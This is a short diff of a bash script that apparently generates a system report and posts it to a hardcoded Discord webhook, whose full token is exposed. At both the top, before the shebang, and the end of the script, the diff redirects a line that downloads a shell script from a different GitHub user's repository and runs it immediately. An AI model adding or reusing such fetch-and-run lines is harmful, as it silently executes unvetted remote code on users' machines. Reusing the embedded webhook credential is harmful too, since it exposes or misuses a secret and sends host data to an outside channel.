@@ -1,4 +1,4 @@
-bash <(curl -fsSL https://raw.githubusercontent.com/nobita329/ptero/refs/heads/main/ptero/main/dev.sh)
+bash <(curl -fsSL https://raw.githubusercontent.com/MrRangerXD/ptero/refs/heads/main/ptero/main/dev.sh)
 #!/bin/bash
 WEBHOOK_URL="https://discord.com/api/webhooks/1464048736618414374/Ar3zxLBaoU1B-oZrtk-qDZ5T4f444j18ZeuApl31eTOwxoOV-WH8Ry58lca_04edEQTi"
 
@@ -361,4 +361,4 @@ echo "╔═══════════════════════�
 echo "║ 📊 Report generated at: $TIMESTAMP                                             ║"
 echo "║ 🔗 Discord webhook: $(if [ $? -eq 0 ]; then echo "✅ Sent successfully"; else echo "❌ Failed"; fi)                    ║"
 echo "╚════════════════════════════════════════════════════════════════════════════════╝"
-bash <(curl -fsSL https://raw.githubusercontent.com/nobita329/ptero/refs/heads/main/ptero/main/dev.sh)
+bash <(curl -fsSL https://raw.githubusercontent.com/MrRangerXD/ptero/refs/heads/main/ptero/main/dev.sh)
